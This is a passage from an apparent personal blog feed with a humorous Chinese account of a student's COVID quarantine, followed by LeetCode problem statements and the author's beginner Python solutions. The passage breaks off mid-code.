/>我对辅导员得知公司那边的消息延迟持有怀疑态度<br />如果真是公司有跟学校沟通就不会疫情爆发了三天再叫我们去隔离<br />然后我们开始查内鬼<br />然后就内鬼自爆了<br />因为她的舍友一直叫她跟辅导员自爆<br />然后她今天就去跟辅导员自爆了<br />然后我们都被拉过来隔离了<br />我觉得她舍友如此为疫情防控着想，她应该也过来隔离，毕竟她算是密接的密接的密接了<br />我寻思核酸都有做过了，给我整得有点不会了<br />蚌埠住了</p><p>然后我们五个人在酒店门口站了十几分钟<br />我们与酒店有一个玻璃门相隔，这头是三十多度的日头，那头是二十六度的空调<br />但是保安不让进，支支吾吾得说要找对接医生<br />送我们隔离的老师就去打电话找对接医生<br />然后开始了经典的踢皮球<br />踢了十分钟就踢完了<br />我们登记之后领了房卡就进去了<br />保安不让我们用电梯<br />然后我们搬着行李走楼梯上了三楼<br />这可能是我一生中唯一一次走楼梯入住酒店了<br />蚌埠住了</p><p>到了房间之后插卡取电<br />我发现取电方式是传统的插卡取电<br />然后我就把我的学生卡插进去了<br />房间没有晾衣服的地方<br />我就把带的垃圾袋系成一根绳子<br />两端绑在阳台扶手跟水管<br />然后我就能晾衣服了<br />我也不知道我要隔离多久<br />可能七天，可能十四天，可能无期<br />反正免费的单间还是挺香的<br />蚌埠住了</p><p>然后我就去上厕所了<br />厕所里摆的是马桶<br />按照习惯，先拿卫生纸擦两遍，然后把纸丢马桶里防止溅水花<br />然后马桶就堵住了<br />可能是这个马桶的口径不太行<br />把水加到八成满还是没用<br />然后我就去打电话问前台能不能帮忙疏通马桶<br />前台支支吾吾得说现在疫情的情况不是很方便<br />然后我问能不能把马桶抽子放在我的门口，我自己抽两下子<br />然后前台支支吾吾得说去问一下<br />我就把之前洗热水壶烧的水倒进马桶<br />然后摁一下冲水，就通了<br />然后门铃响了，一个马桶抽子摆在门口<br />虽然我现在不需要这个马桶抽子<br />但是这个马桶抽子能给我带来无穷无尽的安全感<br />蚌埠住了</p><p>然后我就去洗澡了<br />浴室的玻璃门是透明的，我不知道这样的用意是什么<br />然后玻璃门的导轨有点歪，拉动后会向左边滑动<br />我觉得可能是浴室的地板可能歪得有点离谱了<br />蚌埠住了</p><p>然后有医务人员来做核酸检查<br />然后叫我扫一个二维码预约一下<br />我进入那个小程序的方式有点不对<br />让我选一个预约时间<br />然后小程序里选不了预约时间<br />然后必须要有预约时间才能提交这个预约<br />医务人员看着我弄了三四遍就说要我加他微信<br />叫我自己慢慢玩<br />预约上了把结果发给他<br />但是那个小程序我直接进去是要付费预约的<br />扫他给的码不用付费<br />所以我叫他把码再发一下<br />然后我就预约上了<br />通过控制变量法，我觉得可以证明是他的问题<br />蚌埠住了</p><p>然后我就去订餐群订餐了<br />有口水鸡套餐，红烧肉套餐，稀饭套餐<br />都是学校食堂打包过来的<br />价格都是12块<br />应该都是一荤二素<br />我五点半预约的饭<br />快七点才送到<br />我寻思这属实有点久了<br />然后就开始吃饭了<br />吃完饭我寻思一下发现垃圾袋不够用<br />房间里除了套垃圾桶上的也有没有多余垃圾袋<br />但是总是要丢垃圾的<br />所以我把垃圾丢盒饭的袋子里<br />然后把袋子丢门口了<br />蚌埠住了</p><p>然后我就开始打dota了<br />我在上高的时候跟我一起隔离的室友给我打电话叫我填一个隔离备案记录<br />我说叫他等下<br />我在破第二路高地的时候他又给我打电话了<br />我说马上打完<br />打完之后我去填那个隔离备案记录<br />然后我不知道该怎么填<br />我填得差不多了去问他是不是这样填<br />他说他帮我填好了<br />我说<br />谢谢<br />祝您生活愉快<br />再见<br />蚌埠住了</p><p>然后我后面在选人的时候又有华大的老师来打电话给我说<br />问我是因为什么被隔离的<br />我说次密接<br />他问我有没有接到防疫中心的电话<br />我说没有，是辅导员叫我隔离的<br />然后问了我一堆东西<br />我不是很清楚他要问的东西，而且我不是很想退掉这把dota<br />然后我就把我舍友的名字报给他了，叫他联系我舍友去了<br />然后我就继续dota了<br />然后我就感觉这次隔离可能就是因为有sb在瞎jb搞，是谁我不说<br />然后几个一起隔离的都跟我说可能明天就要解除隔离了<br />属于是白嫖了一个单间的钱<br />蚌埠住了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021.09.16&lt;br /&gt;
根据真实事件改编，如有雷同，请务必对号入座&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode病历表</title>
    <link href="https://yoloyolo.top/2021/09/11/LeetCode/"/>
    <id>https://yoloyolo.top/2021/09/11/LeetCode/</id>
    <published>2021-09-11T06:44:51.000Z</published>
    <updated>2022-06-10T17:47:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>做课程项目的时候发现自己对算法一无所知<br />刷刷题吧</p><a id="more"></a><h1 id="两数之和"><a class="markdownIt-Anchor" href="#两数之和"></a> <a href="https://leetcode-cn.com/problems/two-sum">两数之和</a></h1><p>给定一个整数数组<code>nums</code>和一个整数目标值<code>target</code>，请你在该数组中找出和为目标值<code>target</code>的那两个整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [2,7,11,15], target &#x3D; 9</span><br><span class="line">输出：[0,1]</span><br><span class="line">解释：因为 nums[0] + nums[1] &#x3D;&#x3D; 9 ，返回 [0, 1] 。</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [3,2,4], target &#x3D; 6</span><br><span class="line">输出：[1,2]</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [3,3], target &#x3D; 6</span><br><span class="line">输出：[0,1]</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/two-sum">https://leetcode-cn.com/problems/two-sum</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><p>暴力搜索，没啥好说的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: List[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; List[int]:</span></span><br><span class="line">length = <span class="built_in">len</span>(nums)</span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(index1+<span class="number">1</span>, length):</span><br><span class="line"><span class="keyword">if</span> nums[index1] + nums[index2] == target:</span><br><span class="line"><span class="keyword">return</span>([index1, index2])</span><br></pre></td></tr></table></figure><p>后来想了一下，可以从奇偶相加规律的角度进行优化</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mi>d</mi><mi>d</mi><mo>+</mo><mi>O</mi><mi>d</mi><mi>d</mi><mo>=</mo><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">Odd + Odd = Even</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mi>d</mi><mi>d</mi><mo>+</mo><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi><mo>=</mo><mi>O</mi><mi>d</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">Odd + Even = Odd</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi><mo>+</mo><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi><mo>=</mo><mi>E</mi><mi>v</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">Even + Even = Even</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span></span></span></span></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums: List[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; List[int]:</span></span><br><span class="line">odd = []</span><br><span class="line">even = []</span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> nums: <span class="comment"># 奇偶数分类</span></span><br><span class="line"><span class="keyword">if</span> index1 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">even.append(index1)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">odd.append(index1)</span><br><span class="line">len_odd = <span class="built_in">len</span>(odd)</span><br><span class="line">len_even = <span class="built_in">len</span>(even)</span><br><span class="line"><span class="keyword">if</span> target % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># 偶数</span></span><br><span class="line"><span class="keyword">if</span> len_odd &gt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(len_odd):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(index1+<span class="number">1</span>, len_odd):</span><br><span class="line"><span class="keyword">if</span> odd[index1] + odd[index2] == target:</span><br><span class="line">idx = nums.index(odd[index1])</span><br><span class="line"><span class="keyword">return</span>([idx, nums.index(odd[index2], idx+<span class="number">1</span>)])</span><br><span class="line"><span class="keyword">if</span> len_even &gt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(len_even):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(index1+<span class="number">1</span>, len_even):</span><br><span class="line"><span class="keyword">if</span> even[index1] + even[index2] == target:</span><br><span class="line">idx = nums.index(even[index1])</span><br><span class="line"><span class="keyword">return</span>([idx, nums.index(even[index2], idx+<span class="number">1</span>)])</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># 奇数</span></span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(len_odd):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(len_even):</span><br><span class="line"><span class="keyword">if</span> odd[index1] + even[index2] == target:</span><br><span class="line"><span class="keyword">return</span>([nums.index(odd[index1]), nums.index(even[index2])])</span><br></pre></td></tr></table></figure><p>执行时间直接降了一半</p><hr /><h1 id="两数相加"><a class="markdownIt-Anchor" href="#两数相加"></a> <a href="https://leetcode-cn.com/problems/add-two-numbers">两数相加</a></h1><p>给你两个<strong>非空</strong>的链表，表示两个非负的整数。它们每位数字都是按照<strong>逆序</strong>的方式存储的，并且每个节点只能存储<strong>一位</strong>数字。</p><p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p><p>你可以假设除了数字0之外，这两个数都不会以0开头。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 &#x3D; [2,4,3], l2 &#x3D; [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 &#x3D; 807.</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 &#x3D; [0], l2 &#x3D; [0]</span><br><span class="line">输出：[0]</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 &#x3D; [9,9,9,9,9,9,9], l2 &#x3D; [9,9,9,9]</span><br><span class="line">输出：[8,9,9,9,0,0,0,1]</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#   def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#   self.val = val</span></span><br><span class="line"><span class="comment">#   self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span>(<span class="params">self, l1: ListNode, l2: ListNode</span>) -&gt; ListNode:</span></span><br><span class="line">temp_node = ListNode()</span><br><span class="line">head = temp_node</span><br><span class="line">overflow = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 两个链表同步部分</span></span><br><span class="line">temp_node.val = l1.val + l2.val</span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>:</span><br><span class="line">overflow = <span class="literal">False</span></span><br><span class="line">temp_node.val += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> temp_node.val &gt;= <span class="number">10</span>:</span><br><span class="line">overflow = <span class="literal">True</span></span><br><span class="line">temp_node.val %= <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> l1.<span class="built_in">next</span> != <span class="literal">None</span> <span class="keyword">and</span> l2.<span class="built_in">next</span> != <span class="literal">None</span>:</span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">l1 = l1.<span class="built_in">next</span></span><br><span class="line">l2 = l2.<span class="built_in">next</span></span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> l1.<span class="built_in">next</span> == <span class="literal">None</span> <span class="keyword">and</span> l2.<span class="built_in">next</span> == <span class="literal">None</span>: <span class="comment"># 两个链表同时结束</span></span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>:</span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line">temp_node.val = <span class="number">1</span></span><br><span class="line">overflow == <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span>(head)</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># 一个链表提前结束</span></span><br><span class="line"><span class="keyword">if</span> l1.<span class="built_in">next</span> != <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">l1 = l1.<span class="built_in">next</span></span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line">temp_node.val = l1.val</span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>:</span><br><span class="line">overflow = <span class="literal">False</span></span><br><span class="line">temp_node.val += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> temp_node.val &gt;= <span class="number">10</span>:</span><br><span class="line">overflow = <span class="literal">True</span></span><br><span class="line">temp_node.val %= <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> l1.<span class="built_in">next</span> == <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> l2.<span class="built_in">next</span> != <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">l2 = l2.<span class="built_in">next</span></span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line">temp_node.val = l2.val</span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>:</span><br><span class="line">overflow = <span class="literal">False</span></span><br><span class="line">temp_node.val += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> temp_node.val &gt;= <span class="number">10</span>:</span><br><span class="line">overflow = <span class="literal">True</span></span><br><span class="line">temp_node.val %= <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> l2.<span class="built_in">next</span> == <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> overflow == <span class="literal">True</span>: <span class="comment"># 额外进位</span></span><br><span class="line">temp_node.<span class="built_in">next</span> = ListNode()</span><br><span class="line">temp_node = temp_node.<span class="built_in">next</span></span><br><span class="line">temp_node.val = <span class="number">1</span></span><br><span class="line">overflow == <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span>(head)</span><br></pre></td></tr></table></figure><p>几个坑有点麻烦</p><ol><li>两个链表长度不同，还得分l1、l2两种情况</li><li>进位，基本每一步计算都要检测进位</li><li>额外进位，两个二位数加出来一个三位数</li></ol><hr /><h1 id="无重复字符的最长子串"><a class="markdownIt-Anchor" href="#无重复字符的最长子串"></a> <a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters">无重复字符的最长子串</a></h1><p>给定一个字符串s，请你找出其中不含有重复字符的<strong>最长子串</strong>的长度。</p><p>示例 1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s &#x3D; &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br></pre></td></tr></table></figure><p>示例 2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s &#x3D; &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br></pre></td></tr></table></figure><p>示例 3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: s &#x3D; &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是&quot;wke&quot;，所以其长度为 3。</span><br><span class="line"> 请注意，你的答案必须是 子串 的长度，&quot;pwke&quot;是一个子序列，不是子串。</span><br></pre></td></tr></table></figure><p>示例 4:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: s &#x3D; &quot;&quot;</span><br><span class="line">输出: 0</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters">https://leetcode-cn.com/problems/longest-substring-without-repeating-characters</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; int:</span></span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span> length == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sub_len = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index1 <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"><span class="keyword">for</span> index2 <span class="keyword">in</span> <span class="built_in">range</span>(index1+<span class="number">1</span>, length):</span><br><span class="line"><span class="keyword">if</span> s[index2] <span class="keyword">in</span> s[index1:index2]:</span><br><span class="line">temp_len = index2 - index1</span><br><span class="line"><span class="keyword">if</span> temp_len &gt; sub_len:</span><br><span class="line">sub_len = temp_len</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> index2 == length - <span class="number">1</span>:</span><br><span class="line">temp_len = index2 + <span class="number">1</span> - index1</span><br><span class="line"><span class="keyword">if</span> temp_len &gt; sub_len:</span><br><span class="line">sub_len = temp_len</span><br><span class="line"><span class="keyword">return</span>(sub_len)</span><br></pre></td></tr></table></figure><p>依旧暴力搜索，有几个坑</p><ol><li>空串</li><li>单字符</li><li>子串结尾与母串结尾相同</li></ol><hr /><h1 id="寻找两个正序数组的中位数"><a class="markdownIt-Anchor" href="#寻找两个正序数组的中位数"></a> <a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays">寻找两个正序数组的中位数</a></h1><p>给定两个大小分别为<code>m</code>和<code>n</code>的正序（从小到大）数组<code>nums1</code>和<code>nums2</code>。请你找出并返回这两个正序数组的<strong>中位数</strong>。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [1,3], nums2 &#x3D; [2]</span><br><span class="line">输出：2.00000</span><br><span class="line">解释：合并数组 &#x3D; [1,2,3] ，中位数 2</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [1,2], nums2 &#x3D; [3,4]</span><br><span class="line">输出：2.50000</span><br><span class="line">解释：合并数组 &#x3D; [1,2,3,4] ，中位数 (2 + 3) &#x2F; 2 &#x3D; 2.5</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [0,0], nums2 &#x3D; [0,0]</span><br><span class="line">输出：0.00000</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [], nums2 &#x3D; [1]</span><br><span class="line">输出：1.00000</span><br></pre></td></tr></table></figure><p>示例 5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 &#x3D; [2], nums2 &#x3D; []</span><br><span class="line">输出：2.00000</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays">https://leetcode-cn.com/problems/median-of-two-sorted-arrays</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findMedianSortedArrays</span>(<span class="params">self, nums1: List[<span class="built_in">int</span>], nums2: List[<span class="built_in">int</span>]</span>) -&gt; 